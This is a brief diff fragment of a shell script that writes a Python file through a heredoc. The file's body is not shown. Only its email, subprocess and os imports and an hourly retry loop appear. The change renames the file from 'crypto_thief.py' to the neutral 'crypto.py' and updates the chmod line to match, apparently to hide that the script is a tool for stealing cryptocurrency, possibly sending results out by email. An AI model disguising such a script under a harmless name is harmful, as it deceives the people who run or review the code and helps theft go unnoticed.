@@ -1,4 +1,4 @@
-cat > crypto_thief.py << 'EOF'
+cat > crypto.py << 'EOF'
 #!/usr/bin/env python3
 import smtplib, ssl, time, random, json, subprocess, re, os
 from email.mime.text import MIMEText
@@ -90,6 +90,7 @@ while True:
         time.sleep(3600)  # Retry hourly if crash
 EOF
 
-chmod +x crypto_thief.py
+chmod +x crypto.py
+
 
 
